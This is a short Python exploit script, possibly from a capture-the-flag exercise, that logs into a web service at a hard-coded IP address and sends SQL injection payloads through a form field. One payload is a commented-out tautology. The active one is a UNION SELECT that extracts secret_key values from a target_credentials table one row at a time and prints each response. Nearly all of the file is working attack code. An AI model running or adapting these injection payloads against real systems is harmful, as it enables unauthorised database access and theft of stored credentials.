#!/usr/bin/env python3

import requests

URL_BASE = "http://47.242.21.212:8082"
headers = {"Content-Type": "application/x-www-form-urlencoded",
           "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
           "Referer": f"{URL_BASE}/",
          }

s = requests.session()
s.post(f"{URL_BASE}/login", data={"username":"", "password":"x"})

for i in range(0, 10):
    #PLOAD = f"x' or '1' = '1' LIMIT 1 OFFSET 2;--"
    PLOAD = f"x' union select (SELECT secret_key FROM target_credentials limit 1 offset {i}),'b';--"
    print(s.post(f"{URL_BASE}", files={"name": (None, PLOAD)}).content.decode())